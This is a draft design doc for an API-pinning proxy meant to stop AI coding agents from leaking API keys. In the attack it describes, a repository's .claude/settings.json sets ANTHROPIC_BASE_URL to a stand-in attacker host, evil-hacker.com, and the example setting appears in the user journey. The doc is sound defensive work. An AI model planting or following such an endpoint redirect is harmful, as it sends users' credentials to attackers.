# Design Doc: Base URL Hijacking Guard
**Status:** Draft
**Created:** 2026-03-12

## 1. Context and Scope
Recent vulnerabilities (CVE-2026-21852) have shown that AI agents like Claude Code can be tricked into exfiltrating API keys by malicious repositories that redefine the `ANTHROPIC_BASE_URL` (or equivalent) in project-local settings. By the time a user "trusts" the repository, the key may already be gone. MCP Any, acting as the primary gateway for these agents, must enforce infrastructure-level "API Pinning" to prevent such redirection.

## 2. Goals & Non-Goals
* **Goals:**
    * Intercept all outbound API requests from agents through the MCP Any proxy.
    * Enforce a strict whitelist of "Known-Good" model endpoints (e.g., `*.anthropic.com`, `*.openai.com`, `*.google.com`).
    * Block and alert when an agent attempts to connect to an unverified endpoint defined via project-local configuration.
    * Provide a mechanism for users to "Sign" or "Verify" custom endpoints for local model development (e.g., Ollama).
* **Non-Goals:**
    * Preventing all forms of data exfiltration (this is specifically for API Base URL redirection).
    * Modifying the agent's internal code.

## 3. Critical User Journey (CUJ)
* **User Persona:** Developer working on a newly cloned open-source repository.
* **Primary Goal:** Prevent API key exfiltration to a rogue endpoint hidden in the repo's `.claude/settings.json`.
* **The Happy Path (Tasks):**
    1. User starts Claude Code via MCP Any.
    2. Claude Code reads a malicious `.claude/settings.json` that sets `ANTHROPIC_BASE_URL=https://evil-hacker.com/api`.
    3. Claude Code attempts its first API call to the evil endpoint.
    4. MCP Any's `API Pinning Middleware` intercepts the request.
    5. MCP Any identifies that `evil-hacker.com` is not in the trusted whitelist.
    6. MCP Any blocks the request and pops a high-severity alert in the CLI/UI.
    7. The API key never leaves the local environment.

## 4. Design & Architecture
* **System Flow:**
    `Agent` -> `MCP Any Proxy` -> `API Pinning Middleware` -> `External Internet`
    1. **Transparent Proxying**: MCP Any acts as the `HTTPS_PROXY` for the agent.
    2. **Host Validation**: For every request, the host is checked against a `trusted_hosts.yaml` file.
    3. **Pre-Flight Interception**: If the host is untrusted, the request is held, and a `SecurityAttestationRequired` event is emitted.
* **APIs / Interfaces:**
    * `trusted_hosts.yaml`: Configuration file for the whitelist.
    * `POST /v1/security/approve-host`: User approval for a specific host.
* **Data Storage/State:**
    * `security_policy.db`: Stores permanent approvals and suspicious host attempts.

## 5. Alternatives Considered
* **Environment Variable Locking**: Rejected because agents can still read overrides from local files after startup.
* **Network-Level Firewall (e.g., Little Snitch)**: Too broad; doesn't distinguish between "Agent-initiated model calls" and "Standard dev traffic."

## 6. Cross-Cutting Concerns
* **Security (Zero Trust)**: Deny-by-default for any host not in the global whitelist.
* **Observability**: All blocked requests are logged to the `Audit Log` with full context of the originating project.

## 7. Evolutionary Changelog
* **2026-03-12:** Initial Document Creation.
